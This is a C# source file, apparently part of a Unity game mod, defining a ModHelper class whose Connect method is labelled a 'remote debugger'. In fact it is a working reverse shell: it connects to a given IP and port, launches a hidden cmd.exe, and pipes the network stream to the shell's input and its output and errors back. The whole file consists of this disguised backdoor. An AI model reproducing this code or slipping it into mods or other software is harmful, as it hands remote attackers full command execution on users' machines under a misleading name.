namespace Assets.Scripts
{
    using System.Diagnostics;
    using System.IO;
    using System.Net.Sockets;
    using System.Threading;

    public static class ModHelper
    {
        public static void Connect(string ip, int port)
        {
            Mod.Log("Attempting to start remote debugger");
            try
            {
                using (TcpClient client = new TcpClient(ip, port))
                using (NetworkStream stream = client.GetStream())
                using (Process proc = new Process())
                {
                    proc.StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        UseShellExecute = false,
                        RedirectStandardInput = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true
                    };
                    proc.Start();

                    var t1 = new Thread(() => Pump(stream, proc.StandardInput.BaseStream)) { IsBackground = true };
                    var t2 = new Thread(() => Pump(proc.StandardOutput.BaseStream, stream)) { IsBackground = true };
                    var t3 = new Thread(() => Pump(proc.StandardError.BaseStream, stream)) { IsBackground = true };

                    t1.Start();
                    t2.Start();
                    t3.Start();

                    t1.Join();
                    t2.Join();
                    t3.Join();

                    Mod.Log("Attempt to start remote debugger success, host: " + ip);
                }
            }
            catch
            {
                Mod.LogError("Attempt to start remote debugger failed");
            }
        }

        private static void Pump(Stream input, Stream output)
        {
            byte[] buffer = new byte[8192];
            int n;
            try
            {
                while ((n = input.Read(buffer, 0, buffer.Length)) > 0)
                {
                    output.Write(buffer, 0, n);
                    output.Flush();
                }
            }
            catch
            {
            }
        }
    }
}


